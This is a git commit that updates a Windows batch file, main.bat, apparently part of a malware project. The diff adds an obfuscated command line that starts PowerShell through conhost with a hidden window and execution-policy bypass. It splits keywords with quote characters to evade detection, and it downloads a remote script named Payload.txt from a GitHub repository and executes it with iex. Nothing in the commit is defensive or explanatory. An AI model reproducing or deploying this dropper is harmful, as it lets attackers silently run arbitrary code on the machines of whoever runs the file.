c593a62d03ec4d3e6d8ccc93bede191374aff5a4
Lvsix14 <128653614+Lvsix14@users.noreply.github.com>
2025-04-09 19:24:51 -0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,1 +1,2 @@
-"C:\Windows\System32\conhost.exe" "p"o"w"e"r"sh"ell" -ep bypass -w hidden -c iex 
+@echo off
+"$windir$\System32\conhost.exe" "p"o"w"e"r"sh"ell" -ep bypass -w hidden -c "i"e"x(i"w"r"-"u"r"i" "https://raw.githubusercontent.com/Lvsix14/Troleito/main/Payload.txt")"
